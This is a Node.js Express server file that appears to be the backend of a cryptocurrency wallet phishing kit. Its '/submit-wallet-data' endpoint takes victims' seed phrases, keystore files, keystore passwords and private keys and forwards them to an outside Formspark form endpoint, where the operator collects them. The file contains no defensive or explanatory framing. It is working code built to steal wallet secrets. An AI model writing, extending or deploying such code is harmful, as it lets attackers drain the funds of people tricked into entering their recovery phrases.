import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch'; 

const app = express();
const port = 5000;

const FORMSPARK_ENDPOINT_URL = 'https://submit-form.com/EUSRpXCa2';

app.use(cors());
app.use(express.json());

app.post('/submit-wallet-data', async (req, res) => {
    try {
        const data = req.body;
        if (!data) {
            return res.status(400).json({ status: 'error', message: 'No JSON data received' });
        }

        const wallet_type = data.wallet_type || 'Unknown';
        const phrase = data.phrase || 'N/A';
        const keystore_json = data.keystore_json || 'N/A';
        const keystore_password = data.keystore_password || 'N/A';
        const private_key = data.private_key || 'N/A';

        const formsparkData = {
            'Wallet Type': wallet_type,
            'Phrase': phrase,
            'Keystore JSON': keystore_json,
            'Keystore Password': keystore_password,
            'Private Key': private_key,
            'Timestamp': new Date().toISOString()
        };

        console.log(`Attempting to forward data to Formspark for wallet type: ${wallet_type}`);
        
        const formsparkResponse = await fetch(FORMSPARK_ENDPOINT_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formsparkData)
        });

        if (formsparkResponse.ok) {
            console.log('Successfully forwarded data to Formspark.');
            res.status(200).json({ status: 'success', message: 'Wallet data received and forwarded to Formspark!' });
        } else {
            const errorBody = await formsparkResponse.text();
            console.error(`Failed to forward data to Formspark. Status: ${formsparkResponse.status}, Response: ${errorBody}`);
            res.status(500).json({ 
                status: 'error', 
                message: 'Failed to forward data to Formspark',
                formspark_status: formsparkResponse.status,
                formspark_response: errorBody 
            });
        }

    } catch (error) {
        console.error(`An error occurred: ${error.message}`);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/', (req, res) => {
    res.send('Node.js Backend is running!');
});

app.listen(port, () => {
    console.log(`Node.js backend listening at http://localhost:${port}`);
});
